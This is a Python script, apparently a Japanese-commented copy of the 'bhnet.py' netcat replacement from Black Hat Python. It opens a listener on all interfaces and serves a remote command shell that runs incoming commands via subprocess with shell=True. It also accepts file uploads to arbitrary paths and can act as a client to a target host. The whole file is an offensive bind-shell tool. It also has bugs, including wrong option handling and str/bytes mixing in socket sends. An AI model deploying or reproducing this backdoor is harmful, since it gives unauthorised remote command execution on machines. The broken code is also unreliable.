import sys
import socket
import getopt
import threading
import subprocess
import traceback

#グローバル変数の定義
listen = False
command = False
upload = False
execute = ''
target = ''
upload_destination = ''
port = 0

def usage():
    print('Usage: bhnet.py - t target_host -p port')
    print('''
-l --listen                  -待ち受けするホストとポート
-e --execute=file_to_run     -指定されたファイルを実行する
-c --command                 -コマンドシェルの初期化
-u --upload=destination      -受信後にファイルをアップロードする先
''')
    print('''
Examples:
bhnet.py - t 127.0.0.1 -p 1234 -l -c
bhnet.py - t 127.0.0.1 -p 1234 -l -u c:¥¥sample.exe
echo "GOGO" | ./bhnet.py - t 127.0.0.1 -p 1234
''')

def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    #コマンドラインオプションの読み込み
    try:
        opts, args = getopt.getopt(sys.argv[1:],
        'hle:t:p:cu:',
        ['help', 'listen', 'execute=', 'target=',
        'port=', 'command', 'upload='])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ('-h', '--help'):
            listen = True
        elif o in ('-l', '--listen'):
            listen = True
        elif o in ('-e', '--execute'):
            execute = True
        elif o in ('-c', 'command'):
            command = True
        elif o in ('-u', '--upload'):
            upload_destination = a
        elif o in ('-t', '--target'):
            target = a
        elif o in ('-p', '--port'):
            port = int(a)
        else:
            assert False, 'Unhandled Option'

    #接続を待機する or 標準入力からデータを受け取って送信する
    if not listen and len(target) and port > 0:
        #コマンドラインからの入力を`buffer`に格納する
        #入力がないと処理が継続されないので、標準入力にデータを送らない場合はCtrl+Dを入力する
        buffer = sys.stdin.read()
        #データ送信
        client_sender(buffer)

    #接続待機を開始
    #コマンドラインオプションに応じてファイルをアップロードする
    if listen:
        server_loop()

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        #標的ホストへの接続
        client.connect((target, port))
        if len(buffer):
            client.send(buffer.encode('utf-8'))
        while True:
            #標的ホストからのデータを待機
            recv_len = 1
            response = ''

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data.decode('cp932')

                if recv_len < 4096:
                    break

            print(response)

            #追加の入力を待機
            buffer = input('')
            buffer += '\n'

            #データの送信
            client.send(buffer.encode('utf-8'))
    except Exception as e:
        print('[*] Exception! Exiting.')
        print(e)
        print(traceback.print_exc())
        client.close()

def server_loop():
    global target
    #待機するIPアドレスが指定されていない場合は
    #全てのインターフェースで接続を待機
    if not len(target):
        target = '0.0.0.0'

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        print(addr)
        print(client_socket)

        #クライアントからの新しい接続を処理するスレッドの起動
        client_thread = threading.Thread(target=client_handler, args=(client_socket, ))
        client_thread.start()

def run_command(command : str):
    #文字列の末尾の改行を削除
    command = command.rstrip()

    #コマンドを実行し出力結果を取得
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = 'Failed to execute command\n'

    #出力結果をクライアントに送信
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    #ファイルアップロードを指定されているかどうかの確認
    if len(upload_destination):
        #全てのデータを読み取り、指定されたファイルにデータを書き込み
        file_buffer = ''
        #受信データがなくなるまでループ
        while True:
            data = client_socket.recv(1024)

            if len(data) == 0:
                break
            else:
                file_buffer += data
        #受信したデータをファイルに書き込み
        try:
            with open(upload_destination, 'wb') as file_descriptor:
                file_descriptor.write(file_buffer)

            #ファイル書き込みの結果を通知
            client_socket.send(f'Successfully saved fiel to {upload_destination}\n')
        except:
            client_socket.send(f'Failed to save file to {upload_destination}\n')
    #コマンド実行を指定されているかどうかの確認
    if len(execute):
        #コマンドの実行
        output = run_command(execute)
        client_socket.send(output)

    #コマンドシェルの実行を指定されている場合の処理
    if command:
        #プロンプトの表示
        prompt = b'<BHP:#> '
        client_socket.send(prompt)

        while True:
            #エンターキーを受け取るまでデータを受信
            cmd_buffer = ''
            while '\n' not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode('cp932')

            #コマンドの実行結果を取得
            response = run_command(cmd_buffer)
            response += prompt

            #コマンドの実行結果を送信
            client_socket.send(response)
main()


